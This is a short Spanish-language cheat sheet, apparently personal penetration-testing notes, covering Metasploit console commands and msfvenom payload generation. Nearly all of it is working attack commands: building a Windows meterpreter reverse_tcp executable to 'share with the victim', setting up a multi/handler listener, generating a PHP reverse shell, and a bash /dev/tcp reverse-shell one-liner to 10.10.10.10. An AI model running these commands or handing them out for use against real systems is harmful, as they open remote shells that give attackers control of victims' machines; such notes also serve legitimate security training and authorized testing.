
### Metasploit basics
```bash
* msfconsole (abrir metasploit)
* search <CVE-****> (buscar exploits)
* search <windows | nombre de la vuln ..>
* use <modulo> (utilizar un exploit)
* show options (para ver lo que podemos aplicar en un exploit)
* set (establecer un parámetro)
* run (lanzar un exploit)
* shell (obtener una shell cuando ya hemos establecido una sesión de meterpreter)
```

### Payloads con MsfVenom

#### Payload sesión meterpreter Windows

```bash
#Generamos el payload y lo compartimos con la víctima
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip_atacante> LPORT=443 -f exe -o fichero.exe


# Nos ponemos a la escucha con msfconsole (metasploit)
msfconsole
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LPORT=443
set LHOST=<ip_atacante>
run

# Ya solo falta ejecutar el .exe y recibiremos la sesión de meterpreter

```

#### Payload reverse shell PHP
```bash
#Generamos el payload y lo compartimos con la víctima
msfvenom -p php/reverse_php LHOST=<ip_atacante> LPORT=<puerto_atacante> -f raw > pwned.php

Ahora nos ponemos a la escucha con netcat y listo. IMPORTANTE, esta conexion se puede cerrar. así que una vez dentro es conveniente ejecutar una nueva reverse shell.

# Segunda reverse shell
bash -c "sh -i >& /dev/tcp/10.10.10.10/9001 0>&1"

y nos ponemos a la escucha con netcat
```